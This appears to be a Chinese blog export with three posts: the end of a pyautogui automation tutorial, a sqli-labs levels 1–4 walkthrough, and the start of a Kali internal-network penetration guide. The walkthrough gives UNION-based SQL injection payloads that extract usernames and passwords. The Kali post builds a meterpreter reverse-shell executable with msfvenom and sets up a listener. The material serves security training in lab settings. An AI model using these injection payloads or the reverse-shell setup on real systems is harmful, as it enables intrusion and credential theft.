<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line">pyautogui.PAUSE = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图像识别（一个）</span></span><br><span class="line">btm = pyautogui.locateOnScreen(<span class="string">&#x27;zan.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(btm)  <span class="comment"># Box(left=1280, top=344, width=22, height=22)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图像识别（多个）</span></span><br><span class="line">btm = pyautogui.locateAllOnScreen(<span class="string">&#x27;zan.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(btm))  <span class="comment"># [Box(left=1280, top=344, width=22, height=22), Box(left=25, top=594, width=22, height=22)]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>pyautogui.center((left, top, width, height))</code> 返回指定位置的中心点；这样，我们就可以再配合鼠标操作点击找到图片的中心；参考实例：</li>
</ul>
<h1 id="四、键盘输入"><a href="#四、键盘输入" class="headerlink" title="四、键盘输入"></a>四、键盘输入</h1><h2 id="4-1-键盘输入函数"><a href="#4-1-键盘输入函数" class="headerlink" title="4.1 键盘输入函数"></a>4.1 键盘输入函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.keyDown(): 模拟按键按下;</span><br><span class="line">pyautogui.keyUp(): 模拟按键释放;</span><br><span class="line">pyautogui.press(): <span class="comment"># 就是调用keyDown() &amp; keyUp(),模拟一次按键；</span></span><br><span class="line">pyautogui.typewrite(<span class="string">&#x27;this&#x27;</span>,<span class="number">0.5</span>) ： 第一参数是输入内容，第二个参数是每个字符间的间隔时间；</span><br><span class="line">pyautogui.typewrite([<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;s&#x27;</span>]): typewrite 还可以传入单字母的列表；</span><br></pre></td></tr></table></figure>

<ul>
<li>举例：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.keyDown(<span class="string">&#x27;shift&#x27;</span>)    <span class="comment"># 按下shift</span></span><br><span class="line">pyautogui.press(<span class="string">&#x27;4&#x27;</span>)    <span class="comment"># 按下 4</span></span><br><span class="line">pyautogui.keyUp(<span class="string">&#x27;shift&#x27;</span>)   <span class="comment"># 释放 shift</span></span><br></pre></td></tr></table></figure>

<ul>
<li>输出：$</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.typewrite(<span class="string">&#x27;$$$$&#x27;</span>, <span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>输入$$$$，每个字符间隔为0.5s</li>
</ul>
<h2 id="4-2-键盘特殊按键"><a href="#4-2-键盘特殊按键" class="headerlink" title="4.2 键盘特殊按键"></a>4.2 键盘特殊按键</h2><ul>
<li>有时我们需要输入一些特殊的按键，比如向左的箭头，这些有相对应的键盘字符串表示，例如：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.typewrite([<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;left&#x27;</span>,<span class="string">&#x27;left&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,])   <span class="comment"># 输出：This</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解释：这里的left就是向左的箭头；诸如此类的键盘字符串，还有很多，参考下表：</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636896565778-23ad9491-9635-46c9-8b58-9fc0a33d6bb8.png" alt="img"></p>
<h2 id="4-3-快捷键"><a href="#4-3-快捷键" class="headerlink" title="4.3 快捷键"></a>4.3 快捷键</h2><ul>
<li>如果我们需要模拟复制的快捷键 <code>ctrl + c</code> ，如果用前面的方法，则代码为：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.keyDown(<span class="string">&#x27;ctrl&#x27;</span>)</span><br><span class="line">pyautogui.keyDown(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">pyautogui.keyUp(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">pyautogui.keyUp(<span class="string">&#x27;ctrl&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>快捷键的按键与释放顺序非常关键，这时我们可以使用 <code>pyautogui.hotkey()</code>，这个函数可以接受多个参数，按传入顺序按下，再按照相反顺序释放。上述快捷键 ctrl + c ，可以将代码变为：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.hotkey(<span class="string">&#x27;ctrl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="五、提示信息框"><a href="#五、提示信息框" class="headerlink" title="五、提示信息框"></a>五、提示信息框</h1><h2 id="5-1-提示框-警告框"><a href="#5-1-提示框-警告框" class="headerlink" title="5.1 提示框/警告框"></a>5.1 提示框/警告框</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line">a = pyautogui.alert(text=<span class="string">&#x27;This is an alert box.&#x27;</span>, title=<span class="string">&#x27;Test&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<ul>
<li>输出如下图：点击确定，返回值为OK</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636897046280-c2c00590-701c-4069-9157-31485cc0650d.png" alt="img"></p>
<h2 id="5-2-选择框"><a href="#5-2-选择框" class="headerlink" title="5.2 选择框"></a>5.2 选择框</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line">a = pyautogui.confirm(<span class="string">&#x27;选择一项&#x27;</span>, buttons=[<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<ul>
<li>输出如下图：点击B选项，返回值为B</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636897080022-bcf5e04a-d7e0-416f-986e-2cd6ef49e75b.png" alt="img"></p>
<h2 id="5-3-密码输入"><a href="#5-3-密码输入" class="headerlink" title="5.3 密码输入"></a>5.3 密码输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line">a = pyautogui.password(<span class="string">&#x27;Enter password (text will be hidden)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<ul>
<li>输出如下图：输入密码，显示为密文，点击OK，返回值为刚刚输入的值；</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636897136929-7f2616d8-57b2-4a90-95e3-bcbdd7b949f4.png" alt="img"></p>
<h2 id="5-4-普通输入"><a href="#5-4-普通输入" class="headerlink" title="5.4 普通输入"></a>5.4 普通输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line">a = pyautogui.prompt(<span class="string">&#x27;请输入一个数字：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<ul>
<li>输出如下图：显示为明文，点击OK，返回值为刚刚输入的值；</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636897175956-ae50fe55-04c0-41af-b17c-a66e336215f3.png" alt="img"></p>
<h1 id="六、实例"><a href="#六、实例" class="headerlink" title="六、实例"></a>六、实例</h1><h2 id="6-1-鼠标控制：鼠标画一个正方形"><a href="#6-1-鼠标控制：鼠标画一个正方形" class="headerlink" title="6.1 鼠标控制：鼠标画一个正方形"></a>6.1 鼠标控制：鼠标画一个正方形</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):  <span class="comment"># 画正方形</span></span><br><span class="line">    pyautogui.moveTo(<span class="number">200</span>, <span class="number">200</span>, duration=<span class="number">1</span>)</span><br><span class="line">    pyautogui.moveTo(<span class="number">200</span>, <span class="number">400</span>, duration=<span class="number">1</span>)</span><br><span class="line">    pyautogui.moveTo(<span class="number">400</span>, <span class="number">400</span>, duration=<span class="number">0.5</span>)</span><br><span class="line">    pyautogui.moveTo(<span class="number">400</span>, <span class="number">200</span>, duration=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h2 id="6-2-获取鼠标的实时位置"><a href="#6-2-获取鼠标的实时位置" class="headerlink" title="6.2 获取鼠标的实时位置"></a>6.2 获取鼠标的实时位置</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x, y = pyautogui.position()</span><br><span class="line">        posi = <span class="string">&#x27;x:&#x27;</span> + <span class="built_in">str</span>(x).rjust(<span class="number">4</span>) + <span class="string">&#x27; y:&#x27;</span> + <span class="built_in">str</span>(y).rjust(<span class="number">4</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, posi, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;已退出！&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>显示效果：</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636897420441-7aa68545-c876-457b-87ea-cf02ffb12993.png" alt="img"></p>
<h2 id="6-3-获取鼠标位置与所在位置的颜色"><a href="#6-3-获取鼠标位置与所在位置的颜色" class="headerlink" title="6.3 获取鼠标位置与所在位置的颜色"></a>6.3 获取鼠标位置与所在位置的颜色</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x, y = pyautogui.position()</span><br><span class="line">        rgb = pyautogui.screenshot().getpixel((x, y))</span><br><span class="line">        posi = <span class="string">&#x27;x:&#x27;</span> + <span class="built_in">str</span>(x).rjust(<span class="number">4</span>) + <span class="string">&#x27; y:&#x27;</span> + <span class="built_in">str</span>(y).rjust(<span class="number">4</span>) + <span class="string">&#x27;  RGB:&#x27;</span> + <span class="built_in">str</span>(rgb)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, posi, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;已退出！&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>显示效果：</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636897583354-3dc3b0c1-785a-44c1-a4b2-c8e3ee2393fb.png" alt="img"></p>
<h2 id="6-4-自动点赞程序"><a href="#6-4-自动点赞程序" class="headerlink" title="6.4 自动点赞程序"></a>6.4 自动点赞程序</h2><ul>
<li><p>我们需要将所有的说说点赞，本页上的点赞完成后，就滚动鼠标，把新加载的说说也全部点赞；</p>
</li>
<li><p>代码如下：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zan</span>():</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)    <span class="comment"># 等待 0.5 秒</span></span><br><span class="line">    left, top, width, height = pyautogui.locateOnScreen(<span class="string">&#x27;qzonezan.png&#x27;</span>)   <span class="comment"># 寻找 点赞图片；</span></span><br><span class="line">    center = pyautogui.center((left, top, width, height))    <span class="comment"># 寻找 图片的中心</span></span><br><span class="line">    pyautogui.click(center)    <span class="comment"># 点击</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;点赞成功！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> pyautogui.locateOnScreen(<span class="string">&#x27;qzonezan.png&#x27;</span>):</span><br><span class="line">        zan()   <span class="comment"># 调用点赞函数</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pyautogui.scroll(-<span class="number">700</span>)    <span class="comment"># 本页没有图片后，滚动鼠标；</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;没有找到目标，屏幕下滚~&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636898890823-a459429e-ec80-41d4-a645-df7e91c03afb.png" alt="img"></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs 1-4</title>
    <url>/post/f9788371.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一关：GET-报错注入-单引号-字符型注入"><a href="#第一关：GET-报错注入-单引号-字符型注入" class="headerlink" title="第一关：GET-报错注入-单引号-字符型注入"></a>第一关：GET-报错注入-单引号-字符型注入</h1><h2 id="1-1-判断闭合方式"><a href="#1-1-判断闭合方式" class="headerlink" title="1.1 判断闭合方式"></a>1.1 判断闭合方式</h2><ul>
<li><code>id=1\</code>可以知道为单引号闭合</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597090093-e4216f14-8e22-48cd-916a-bbc53312ff76.png" alt="img"></p>
<ul>
<li><code>id=1&#39;--+</code>验证成功</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597127009-4fe3820a-9afd-4e1d-adc8-6a52cd50bbc4.png" alt="img"></p>
<h2 id="1-2-查看有多少列"><a href="#1-2-查看有多少列" class="headerlink" title="1.2 查看有多少列"></a>1.2 查看有多少列</h2><ul>
<li><code>id=1&#39; order by 3--+</code>用二分法知道有3列</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597243235-6881ab85-c312-4b6d-8372-ece8d4af4a9e.png" alt="img"></p>
<h2 id="1-3-使用联合报错注入"><a href="#1-3-使用联合报错注入" class="headerlink" title="1.3 使用联合报错注入"></a>1.3 使用联合报错注入</h2><ul>
<li><code>id=-1&#39; union select 1,2,3--+</code>使前面报错，使用union报错注入，让后面的结果显示出来，发现2和3的位置可以显示出数据来</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597274516-1eb029b2-35a9-4809-9663-f48a29e3d629.png" alt="img"></p>
<ul>
<li><code>id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),database()--+</code> 知道当前数据库security有emails、referers、uagents、users表</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597455530-b08c5bd3-cdcf-410f-b83a-ef26dda44454.png" alt="img"></p>
<ul>
<li><code>id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),database()--+</code>可以知道users表有id、username、password字段</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597706965-5223f7c9-13b8-43cc-b5b5-e5efc0ee3ab7.png" alt="img"></p>
<ul>
<li></li>
</ul>
<h1 id="第二关：GET-报错注入-数字型注入"><a href="#第二关：GET-报错注入-数字型注入" class="headerlink" title="第二关：GET-报错注入-数字型注入"></a>第二关：GET-报错注入-数字型注入</h1><h2 id="2-1-判断闭合方式"><a href="#2-1-判断闭合方式" class="headerlink" title="2.1 判断闭合方式"></a>2.1 判断闭合方式</h2><ul>
<li><code>id=1\</code>发现貌似是数字型注入</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596320700-81aed030-1364-4fa1-9850-fbe211348c0b.png" alt="img"></p>
<ul>
<li>id=1 and 1=1正常</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596390957-7192a3c5-4cca-4ac0-8c6d-f8953c770574.png" alt="img"></p>
<ul>
<li>id=1 and 1=2失败，可以知道是数字型注入</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596423010-4699c07e-8f44-4535-bd30-fca1c8486064.png" alt="img"></p>
<h2 id="2-2-查看有多少列"><a href="#2-2-查看有多少列" class="headerlink" title="2.2 查看有多少列"></a>2.2 查看有多少列</h2><ul>
<li><code>id=1 order by 3</code> 用二分法可以知道只有三列</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596492235-49d223cd-a073-4f1b-9061-6acb0b070e83.png" alt="img"></p>
<h2 id="2-3-使用联合报错注入"><a href="#2-3-使用联合报错注入" class="headerlink" title="2.3 使用联合报错注入"></a>2.3 使用联合报错注入</h2><ul>
<li><code>id=1 and 1=2 union select 1,2,3</code>让前面报错，让后面的结果显示，可以发现2和3的位置会显示出来</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596583356-9bdf94f0-e614-4240-a333-ad066f158b2c.png" alt="img"></p>
<ul>
<li><code>id=1 and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())</code>可以知道当前数据库为security，由emails、referers、uagents、users表</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596713604-950da20f-9a08-4505-ad9c-393ba48f2d03.png" alt="img"></p>
<ul>
<li><code>id=1 and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)</code>可以知道users表有id、username、password字段</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596815221-c65369f6-14c2-4ffa-b3e3-953f2d1f82ab.png" alt="img"></p>
<ul>
<li><code>id=1 and 1=2 union select 1,2,(select group_concat(username,0x3a,password) from users)</code>可以知道用户名和密码</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596957954-ad3651dc-f1b2-4543-820d-d711752b5d9c.png" alt="img"></p>
<ul>
<li><code>id=-1&#39; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</code>成功爆出用户名和密码</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597844094-e9350f45-b966-4869-b53b-25f0a7ed5cf8.png" alt="img"></p>
<h1 id="第三关：GET-报错注入-单引号和括号-字符型注入"><a href="#第三关：GET-报错注入-单引号和括号-字符型注入" class="headerlink" title="第三关：GET-报错注入-单引号和括号-字符型注入"></a>第三关：GET-报错注入-单引号和括号-字符型注入</h1><h2 id="3-1-判断闭合方式"><a href="#3-1-判断闭合方式" class="headerlink" title="3.1 判断闭合方式"></a>3.1 判断闭合方式</h2><ul>
<li>使用\爆出了错误，可以知道是用(‘xxx’)引起来的</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594183638-70ad1306-cb94-4652-b208-6f06dfbb1066.png" alt="img"></p>
<ul>
<li><code>id=1&#39;)--+</code> 验证成功</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594257003-88644ba6-93d1-4e72-a0ce-11c8ed82f2bd.png" alt="img"></p>
<h2 id="3-2-查看有多少列"><a href="#3-2-查看有多少列" class="headerlink" title="3.2 查看有多少列"></a>3.2 查看有多少列</h2><ul>
<li><code>id=1&#39;) order by 3 --+</code>经过二分法等可以知道有三列</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594414338-7950d42a-fb9e-4256-b01e-0d5512395b90.png" alt="img"></p>
<h2 id="3-3-使用联合报错注入"><a href="#3-3-使用联合报错注入" class="headerlink" title="3.3 使用联合报错注入"></a>3.3 使用联合报错注入</h2><ul>
<li><code>id=-1&#39;) union select 1,2,3--+</code>使用union联合注入，使前面报错，让后面的显示出来，发现2和3的位置会爆出错误信息，接下来就利用这两个位置进行操作</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594517041-6cf8e5c0-19c3-43c8-8a65-cd6f5222061b.png" alt="img"></p>
<ul>
<li><code>id=-1&#39;) union select 1,database(),(select table_name from information_schema.tables where table_schema=database() limit 0,1)--+</code></li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594637338-68c917a8-c08c-40ea-a23c-cb22d98e6932.png" alt="img"></p>
<ul>
<li>或者直接使用<code>id=-1&#39;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code></li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594692274-294ac53c-9da2-4dbb-b686-605d392d0a0f.png" alt="img"></p>
<ul>
<li>可以知道数据库名为security，有emails、referers、uagents、users表</li>
<li><code>id=-1&#39;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+</code>可以知道users表有id、username、password字段</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595049262-ab88812b-a39d-4315-88aa-cc51ec795e04.png" alt="img"></p>
<ul>
<li><code>id=-1&#39;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code>可以查看到用户名和密码</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595358589-5e5df7aa-5759-428e-a935-6062dcadba3d.png" alt="img"></p>
<h1 id="第四关：GET-报错注入-双引号和括号-字符型注入"><a href="#第四关：GET-报错注入-双引号和括号-字符型注入" class="headerlink" title="第四关：GET-报错注入-双引号和括号-字符型注入"></a>第四关：GET-报错注入-双引号和括号-字符型注入</h1><h2 id="4-1-判断闭合方式"><a href="#4-1-判断闭合方式" class="headerlink" title="4.1 判断闭合方式"></a>4.1 判断闭合方式</h2><ul>
<li><code>id=1\</code>可以知道是(“”)闭合</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595788031-a9585c4c-852b-427c-a7a3-45868630c26e.png" alt="img"></p>
<ul>
<li><code>id=1&quot;) --+</code>验证成功</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595929772-142667ce-c3b6-43de-914b-9023b06a5771.png" alt="img"></p>
<h2 id="4-2-查看有多少列"><a href="#4-2-查看有多少列" class="headerlink" title="4.2 查看有多少列"></a>4.2 查看有多少列</h2><ul>
<li><code>id=1&quot;) order by 3--+</code>由二分法可以知道只有3列</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595974473-5279d731-6b6f-4003-b598-04ec09834b92.png" alt="img"></p>
<h2 id="4-3-使用联合报错注入"><a href="#4-3-使用联合报错注入" class="headerlink" title="4.3 使用联合报错注入"></a>4.3 使用联合报错注入</h2><ul>
<li><code>id=-1&quot;) union select 1,2,3--+</code>使用union联合注入，使前面报错，让后面的显示出来，发现2和3的位置会爆出错误信息，接下来就利用这两个位置进行操作</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596020579-14ab5553-585c-4d39-9763-06c74251f984.png" alt="img"></p>
<ul>
<li><code>id=-1&quot;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code>可以知道数据库名为security，有emails、referers、uagents、users表</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596063935-002d0a8d-c961-49ae-abe8-3cfab18be436.png" alt="img"></p>
<ul>
<li><code>id=-1&quot;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+</code>可以知道users表有id、username、password字段</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596125977-af57a214-79ff-4688-bcc7-57c0f8c2d4e1.png" alt="img"></p>
<ul>
<li><code>id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code>可以查看到用户名和密码</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596174923-d39479bd-2cb7-4d3d-99b2-ae2200740604.png" alt="img"></p>
]]></content>
      <categories>
        <category>方向靶场</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqlilabs</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Kali进行内网渗透</title>
    <url>/post/fd7d7a05.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、网络拓扑图"><a href="#一、网络拓扑图" class="headerlink" title="一、网络拓扑图"></a>一、网络拓扑图</h1><p>假如我们拿到了一台主机比如Win2008的shell，如何通过该主机进行内网渗透，拿到比如下图中数据服务器的最高权限？</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651915063822-375ade11-80e0-4ab5-953c-25e6f01bfb6f.png" alt="img"></p>
<h1 id="二、Win2008主机上线"><a href="#二、Win2008主机上线" class="headerlink" title="二、Win2008主机上线"></a>二、Win2008主机上线</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.6 lport=4444 -f exe &gt; /var/www/html/w01ke.exe</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.196</span><br><span class="line">ser lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651915525768-6aba026c-abaa-4f2e-a65a-cb77ce137675.png" alt="img"></p>
<h1 id="三、简单信息收集"><a href="#三、简单信息收集" class="headerlink" title="三、简单信息收集"></a>三、简单信息收集</h1><p>信息收集之前可以输入help了解一下meterpreter下的命令，其中有信息收集，提权等多个模块，自行了解</p>
<h3 id="（1）查看目标主机当前用户与权限"><a href="#（1）查看目标主机当前用户与权限" class="headerlink" title="（1）查看目标主机当前用户与权限"></a>（1）查看目标主机当前用户与权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651916058373-9f1e8add-b8bd-45a9-877e-5d38776f859f.png" alt="img"></p>
<h3 id="（2）查看目标主机系统相关信息"><a href="#（2）查看目标主机系统相关信息" class="headerlink" title="（2）查看目标主机系统相关信息"></a>（2）查看目标主机系统相关信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; sysinfo</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651915791569-ecfd14a4-815e-46e1-aaa2-84cdee6b29b6.png" alt="img"></p>
<h3 id="（3）查看目标主机路由表"><a href="#（3）查看目标主机路由表" class="headerlink" title="（3）查看目标主机路由表"></a>（3）查看目标主机路由表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; route</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651915919618-f5ffe70a-ad40-45b2-8537-aaf9a09b3b84.png" alt="img"></p>
<h3 id="（4）查看目标主机运行进程"><a href="#（4）查看目标主机运行进程" class="headerlink" title="（4）查看目标主机运行进程"></a>（4）查看目标主机运行进程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; ps</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651916157812-63d7bb3a-1fa2-4948-bf05-2e8875a96adb.png" alt="img"></p>
